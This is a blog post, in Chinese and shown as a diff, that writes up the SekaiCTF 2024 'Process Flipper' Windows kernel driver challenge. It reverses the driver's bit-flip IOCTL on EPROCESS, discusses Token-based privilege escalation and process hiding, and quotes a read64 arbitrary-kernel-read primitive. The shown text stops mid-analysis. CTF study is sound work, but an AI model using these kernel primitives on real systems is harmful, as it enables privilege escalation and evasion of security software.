@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="两题干碎我的黑客梦  Process Flipperwindows driver pwn  Windows 11 build 26100.1150  -&gt; win11 24h2 windows defender 上传一个静态链接文件 出题人：nyancat0131 Inspired from a certain anti-cheat used in gacha games  逆向资料  R">
+<meta property="og:type" content="website">
+<meta property="og:title" content="sekaictf2024">
+<meta property="og:url" content="https://ha0-y.github.io/todo/SekaiCTF2024.html">
+<meta property="og:site_name" content="chips">
+<meta property="og:description" content="两题干碎我的黑客梦  Process Flipperwindows driver pwn  Windows 11 build 26100.1150  -&gt; win11 24h2 windows defender 上传一个静态链接文件 出题人：nyancat0131 Inspired from a certain anti-cheat used in gacha games  逆向资料  R">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-01T15:00:07.465Z">
+<meta property="article:modified_time" content="2024-09-01T15:00:07.465Z">
+<meta property="article:author" content="chips">
+<meta property="article:tag" content="Blog">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>sekaictf2024</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">chips</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   --><!--
+     --><li><a href="/archives/">Writing</a></li><!--
+   --><!--
+     --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  
+
+  <div class="content" itemprop="articleBody">
+      
+          <blockquote>
+<p>两题干碎我的黑客梦</p>
+</blockquote>
+<h2 id="Process-Flipper"><a href="#Process-Flipper" class="headerlink" title="Process Flipper"></a>Process Flipper</h2><p>windows driver pwn</p>
+<ul>
+<li>Windows 11 build 26100.1150  -&gt; <a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/software-download/windowsinsiderpreviewiso">win11 24h2</a></li>
+<li>windows defender</li>
+<li>上传一个静态链接文件</li>
+<li>出题人：<a target="_blank" rel="noopener" href="https://sekai.team/members/nyancat0131">nyancat0131</a> Inspired from a certain anti-cheat used in <em>gacha</em> games</li>
+</ul>
+<h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>资料</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://ioactive.com/wp-content/uploads/2018/09/Reverse_Engineering_and_Bug_Hunting_On_KMDF_Drivers.pdf">Reverse Engineering &amp; Bug Hunting on KMDF Drivers</a></li>
+</ul>
+<p>WDF: windows driver framwork<br>KMDF: Kernel-Mode Driver Framework<br>Fx: framwork eXtend</p>
+<p>WDM VS KMDF </p>
+<ul>
+<li>Driver Object -&gt; WDFDriver </li>
+<li>Device Object -&gt; WDFDevice </li>
+<li>Device Extension -&gt; Object Context </li>
+<li>IRP -&gt; WDFRequest </li>
+<li>Dispatch Routines -&gt; IOQueue Handlers</li>
+<li>IO Stack Location -&gt; WDFRequest Params</li>
+</ul>
+<p>Entry: <code>WdfVersionBind</code> </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">WdfVersionBind</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"> __in    PDRIVER_OBJECT DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function"> __in    PUNICODE_STRING RegistryPath,</span></span></span><br><span class="line"><span class="params"><span class="function"> __inout PWDF_BIND_INFO BindInfo,</span></span></span><br><span class="line"><span class="params"><span class="function"> __out   PWDF_COMPONENT_GLOBALS* omponentGlobals</span></span></span><br><span class="line"><span class="params"><span class="function"> )</span></span></span><br></pre></td></tr></table></figure>
+
+<p>BindInfo</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WDF_BIND_INFO</span> &#123;</span><br><span class="line">    ULONG              Size;</span><br><span class="line">    PWCHAR             Component;</span><br><span class="line">    WDF_VERSION        Version;</span><br><span class="line">    ULONG              FuncCount;</span><br><span class="line">    __field_bcount(FuncCount * <span class="built_in">sizeof</span>(WDFFUNC)) WDFFUNC* FuncTable;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __FXLDRUM_H__</span></span><br><span class="line">    PLIBRARY_MODULE    Module;     <span class="comment">// Mgmt and diagnostic use only</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID              Module;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; WDF_BIND_INFO, * PWDF_BIND_INFO;</span><br></pre></td></tr></table></figure>
+
+<p>创建 Device</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PWDFDEVICE_INIT <span class="title">WdfControlDeviceInitAllocate</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] WDFDRIVER            Driver,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">const</span> UNICODE_STRING *SDDLString</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>WDF IO_QUEUE</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WDF_IO_QUEUE_CONFIG</span> &#123;</span><br><span class="line">  ULONG                                       Size;</span><br><span class="line">  WDF_IO_QUEUE_DISPATCH_TYPE                  DispatchType;</span><br><span class="line">  WDF_TRI_STATE                               PowerManaged;</span><br><span class="line">  BOOLEAN                                     AllowZeroLengthRequests;</span><br><span class="line">  BOOLEAN                                     DefaultQueue;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_DEFAULT                 EvtIoDefault;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_READ                    EvtIoRead;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_WRITE                   EvtIoWrite;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_DEVICE_CONTROL          EvtIoDeviceControl;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL EvtIoInternalDeviceControl;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_STOP                    EvtIoStop;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_RESUME                  EvtIoResume;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_CANCELED_ON_QUEUE       EvtIoCanceledOnQueue;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> &#123;</span><br><span class="line">      ULONG NumberOfPresentedRequests;</span><br><span class="line">    &#125; Parallel;</span><br><span class="line">  &#125; Settings;</span><br><span class="line">  WDFDRIVER                                   Driver;</span><br><span class="line">&#125; WDF_IO_QUEUE_CONFIG, *PWDF_IO_QUEUE_CONFIG;</span><br></pre></td></tr></table></figure>
+
+<p>关注 <code>g_WdfBindInfo</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status = (PWDFDEVICE_INIT)<span class="built_in">WdfVersionBind</span>(pDrvObj, &amp;DestinationString, &amp;g_WdfBindInfo, &amp;g_WdfDrvGlobals);</span><br></pre></td></tr></table></figure>
+
+<p>找到这个 <code>g_WdfBindInfo</code>，还原一下</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000140003060</span> g_WdfBindInfo   dd <span class="number">30</span>h                  ; DATA XREF: sub_1400012F8+<span class="number">41</span>↑o</span><br><span class="line">.data:<span class="number">0000000140003060</span>                                         ; sub_140001354+<span class="number">4</span>↑o ...</span><br><span class="line">.data:<span class="number">0000000140003060</span>                                         ; size</span><br><span class="line">.data:<span class="number">0000000140003064</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000140003065</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000140003066</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000140003067</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000140003068</span>                 dq offset aKmdflibrary  ; <span class="string">&quot;KmdfLibrary&quot;</span></span><br><span class="line">.data:<span class="number">0000000140003070</span>                 dd <span class="number">1</span></span><br><span class="line">.data:<span class="number">0000000140003074</span>                 dd <span class="number">0F</span>h</span><br><span class="line">.data:<span class="number">0000000140003078</span>                 dd <span class="number">0</span></span><br><span class="line">.data:<span class="number">000000014000307</span>C                 dd <span class="number">1B</span>Ch</span><br><span class="line">.data:<span class="number">0000000140003080</span>                 dq offset g_FunctionTbl</span><br><span class="line">.data:<span class="number">0000000140003088</span>                 align <span class="number">10</span>h</span><br></pre></td></tr></table></figure>
+
+<p>有很多函数调用使用<code>g_FunctionTbl</code>中的函数指针来进行，借助一个插件还原：<a target="_blank" rel="noopener" href="https://github.com/nccgroup/DriverBuddy/">DriverBuddy</a></p>
+<ul>
+<li>比较新的7.x：<a target="_blank" rel="noopener" href="https://github.com/VoidSec/DriverBuddyReloaded">DriverBuddyReloaded</a></li>
+</ul>
+<p>Device以及SymbolLink</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sub_140005258</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	v3 = ((__int64 (__fastcall *)(WDF_DRIVER_GLOBALS *, __int64 *, __int128 *, WDFDEVICE *))WdfFunctions_KmdfLibrary__1_15-&gt;WdfDeviceCreate)(</span><br><span class="line">           g_WdfDrvGlobals,</span><br><span class="line">           &amp;DeviceInit,</span><br><span class="line">           &amp;DeviceAttributes,</span><br><span class="line">           &amp;Device);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = ((__int64 (__fastcall *)(WDF_DRIVER_GLOBALS *, WDFDEVICE, <span class="type">int</span> *))WdfFunctions_KmdfLibrary__1_15-&gt;WdfDeviceCreateSymbolicLink)(</span><br><span class="line">             g_WdfDrvGlobals,</span><br><span class="line">             Device,</span><br><span class="line">             &amp;SymbolLink);</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+
+<p>函数原型</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">WdfDeviceCreateSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] WDFDEVICE        Device,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PCUNICODE_STRING SymbolicLinkName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>获取SymbolLink的字符串</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PAGE:<span class="number">0000000140005840</span> <span class="number">5</span>C <span class="number">00</span> <span class="number">44</span> <span class="number">00</span> <span class="number">6F</span> <span class="number">00</span> <span class="number">73</span> <span class="number">00</span> <span class="number">44</span> <span class="number">00</span>+xmmword_140005840 xmmword <span class="number">690076006500440073006F</span>0044005Ch</span><br><span class="line">PAGE:<span class="number">0000000140005840</span> <span class="number">65</span> <span class="number">00</span> <span class="number">76</span> <span class="number">00</span> <span class="number">69</span> <span class="number">00</span>                                                     ; DATA XREF: sub_140005000+<span class="number">72</span>↑r</span><br><span class="line">PAGE:<span class="number">0000000140005850</span> <span class="number">63</span> <span class="number">00</span> <span class="number">65</span> <span class="number">00</span> <span class="number">73</span> <span class="number">00</span> <span class="number">5</span>C <span class="number">00</span> <span class="number">50</span> <span class="number">00</span>+xmmword_140005850 xmmword <span class="number">63006F</span>00720050005C007300650063h</span><br><span class="line">PAGE:<span class="number">0000000140005850</span> <span class="number">72</span> <span class="number">00</span> <span class="number">6F</span> <span class="number">00</span> <span class="number">63</span> <span class="number">00</span>                                                     ; DATA XREF: sub_140005000+<span class="number">96</span>↑r</span><br><span class="line">PAGE:<span class="number">0000000140005860</span> <span class="number">65</span> <span class="number">00</span> <span class="number">73</span> <span class="number">00</span> <span class="number">73</span> <span class="number">00</span> <span class="number">46</span> <span class="number">00</span> <span class="number">6</span>C <span class="number">00</span>+xmmword_140005860 xmmword <span class="number">7000700069006</span>C0046007300730065h</span><br></pre></td></tr></table></figure>
+
+<p>UNICODE_STRING转化为字符串: <code>DosDevice\ProcessFlipper</code></p>
+<p>找到IOCTL</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140005778</span><span class="params">(WDFDEVICE Device)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  WDF_IO_QUEUE_CONFIG Config; <span class="comment">// [rsp+30h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Queue; <span class="comment">// [rsp+A8h] [rbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_140001C00</span>((<span class="type">char</span> *)&amp;Config, <span class="number">0</span>, <span class="number">0x60</span>ui64);</span><br><span class="line">  Config.Size = <span class="number">96</span>;</span><br><span class="line">  Config.EvtIoDeviceControl = (PFN_WDF_IO_QUEUE_IO_DEVICE_CONTROL)sub_140001060;</span><br><span class="line">  Config.PowerManaged = WdfUseDefault;</span><br><span class="line">  Config.EvtIoStop = (PFN_WDF_IO_QUEUE_IO_STOP)nullsub_1;</span><br><span class="line">  Config.DefaultQueue = <span class="number">1</span>;</span><br><span class="line">  Config.DispatchType = WdfIoQueueDispatchSequential;</span><br><span class="line">  result = ((__int64 (__fastcall *)(WDF_DRIVER_GLOBALS *, WDFDEVICE, WDF_IO_QUEUE_CONFIG *, _QWORD, <span class="type">char</span> *))WdfFunctions_KmdfLibrary__1_15-&gt;WdfIoQueueCreate)(</span><br><span class="line">             g_WdfDrvGlobals,</span><br><span class="line">             Device,</span><br><span class="line">             &amp;Config,</span><br><span class="line">             <span class="number">0</span>i64,</span><br><span class="line">             &amp;Queue);</span><br><span class="line">  _mm_lfence();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>IOCTL的功能 <code>EPROCESS</code> 结构体指定位置写入</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001060</span><span class="params">(__int64 a1, WDFREQUEST Request, __int64 a3, __int64 a4, <span class="type">int</span> ControlCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> InputBuffer; <span class="comment">// ebx</span></span><br><span class="line">  PEPROCESS CurrentProcess; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 Value_; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> shift_; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 idx; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> value; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 Value; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> shift; <span class="comment">// dl</span></span><br><span class="line">  PVOID Buffer; <span class="comment">// [rsp+30h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Length[<span class="number">16</span>]; <span class="comment">// [rsp+38h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  InputBuffer = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ControlCode == <span class="number">0x222004</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    InputBuffer = (WdfFunctions_KmdfLibrary__1_15-&gt;WdfRequestRetrieveInputBuffer)(</span><br><span class="line">                    g_WdfDrvGlobals,</span><br><span class="line">                    Request,</span><br><span class="line">                    <span class="number">4</span>i64,                       <span class="comment">// size</span></span><br><span class="line">                    &amp;Buffer,</span><br><span class="line">                    Length);</span><br><span class="line">    <span class="keyword">if</span> ( !InputBuffer )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *Buffer &lt;= <span class="number">0x5C00</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        CurrentProcess = <span class="built_in">IoGetCurrentProcess</span>();</span><br><span class="line">        Value = *Buffer;</span><br><span class="line">        shift = Value &amp; <span class="number">7</span>;</span><br><span class="line">        idx = Value &gt;&gt; <span class="number">3</span>;</span><br><span class="line">        value = *(CurrentProcess + idx) | (<span class="number">1</span> &lt;&lt; shift);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ControlCode == <span class="number">0x222008</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    InputBuffer = (WdfFunctions_KmdfLibrary__1_15-&gt;WdfRequestRetrieveInputBuffer)(</span><br><span class="line">                    g_WdfDrvGlobals,</span><br><span class="line">                    Request,</span><br><span class="line">                    <span class="number">4</span>i64,</span><br><span class="line">                    &amp;Buffer,</span><br><span class="line">                    Length);</span><br><span class="line">    <span class="keyword">if</span> ( !InputBuffer )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *Buffer &lt;= <span class="number">0x5C00</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        CurrentProcess = <span class="built_in">IoGetCurrentProcess</span>();</span><br><span class="line">        Value_ = *Buffer;</span><br><span class="line">        shift_ = Value_ &amp; <span class="number">7</span>;</span><br><span class="line">        idx = Value_ &gt;&gt; <span class="number">3</span>;</span><br><span class="line">        value = *(CurrentProcess + idx) &amp; ~(<span class="number">1</span> &lt;&lt; shift_);</span><br><span class="line">LABEL_10:</span><br><span class="line">        *(CurrentProcess + idx) = value;</span><br><span class="line">        <span class="keyword">return</span> (WdfFunctions_KmdfLibrary__1_15-&gt;WdfRequestComplete)(g_WdfDrvGlobals, Request, InputBuffer, a4);</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">      InputBuffer = <span class="number">0xC000000D</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (WdfFunctions_KmdfLibrary__1_15-&gt;WdfRequestComplete)(g_WdfDrvGlobals, Request, InputBuffer, a4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>或运算：任意位置设置为1</p>
+<ul>
+<li><code>value | (1 &lt;&lt; shift)</code></li>
+</ul>
+<p>与运算：任意位置设置为0</p>
+<ul>
+<li><code>value &amp; ~(1 &lt;&lt; shift)</code></li>
+</ul>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>驱动安装</p>
+<figure class="highlight pwsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> create flipper binpath=<span class="string">&quot;C:\Users\ctf\Desktop\ProcessFlipper.sys&quot;</span> <span class="built_in">type</span>=kernel <span class="built_in">start</span>=auto</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line"><span class="built_in">sc</span> stop flipper</span><br><span class="line"><span class="built_in">sc</span> delete flipper</span><br></pre></td></tr></table></figure>
+
+
+<p>Windows通用提权方式：设置 <code>EPROCESS</code> 的 Token 为 System 进程的 Token。</p>
+<ul>
+<li>读取 System 的 Token?</li>
+<li>存在防火墙也意味着某些函数（如NtQuerySystemInformation）会被检测，然后被拦截。</li>
+</ul>
+<blockquote>
+<p>System进程的EPROCESS是由 PsInitialSystemProcess 函数（ntoskrnl.exe）进行初始化</p>
+</blockquote>
+<p>EPROCESS 和 Token 偏移如下，可以修改，其余的元素也可以被修改。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0</span>x248 Token            : _EX_FAST_REF</span><br></pre></td></tr></table></figure>
+
+<p>但是只能bitflip，但是该不对直接提权</p>
+<p>EPROCESS中是否有其余的结构体可以进行提权呢？作者的提示是anti-debug的游戏，如何使用这个结构体进行呢？</p>
+<p>在 <code>EPROCESS</code> 中存在一个 <code>DebugPort</code> 的指针</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.x86matthew.com/view_post?id=selfdebug">x86matthew - SelfDebug - A useless anti-debug trick by forcing a process to debug itself</a></li>
+</ul>
+<p>self-debug? <code>PsIsProcessBeingDebugged</code> 是根据这个结构判断是否被调试</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0</span>x308 DebugPort        : (null)</span><br></pre></td></tr></table></figure>
+
+
+<p>game anti-cheat:</p>
+<ul>
+<li>EPROCESS.ActiveProcessLinks 是一个 <code>LIST_ENTRY</code> 结构，所有的进程被连接起来，可以隐藏进程</li>
+<li>UniqueProcessId 是进程ID</li>
+<li>Token 用于鉴权</li>
+</ul>
+<hr>
+<p>看看 Nu1L 的WP</p>
+<p>借助了EPROCESS如下的属性</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x1d0</span> UniqueProcessId  : Ptr64 Void</span><br><span class="line">+<span class="number">0x1d8</span> ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">...</span><br><span class="line">+<span class="number">0x7f0</span> NetworkCounters  : Ptr64 _PROCESS_NETWORK_COUNTERS</span><br></pre></td></tr></table></figure>
+
+<p>可以看出在 24h2 变化还是比较大的</p>
+<p>一个神奇的函数：read64，任意地址读取</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT64 <span class="title">read64</span><span class="params">(UINT64 Addr)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">SetVal</span>(<span class="number">0x7f0</span>, Addr);</span><br><span class="line">    ULONG returnLength;</span><br><span class="line">    NTSTATUS status = <span class="built_in">NtQueryInformationProcess</span>(<span class="built_in">GetCurrentProcess</span>(), (PROCESSINFOCLASS)<span class="number">0x72</span>, gbuffer, <span class="number">16</span>, &amp;returnLength);</span><br><span class="line">    <span class="keyword">if</span> (status == <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="comment">// STATUS_SUCCESS</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;NtQueryInformationProcess failed with status &quot;</span> &lt;&lt; status &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *(UINT64*)gbuffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>NtQueryInformationProcess</code> 读取了当前进程的EPROCESS信息。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSTATUS <span class="title">NtQueryInformationProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE           ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            PROCESSINFOCLASS ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]           PVOID            ProcessInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PULONG           ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
+
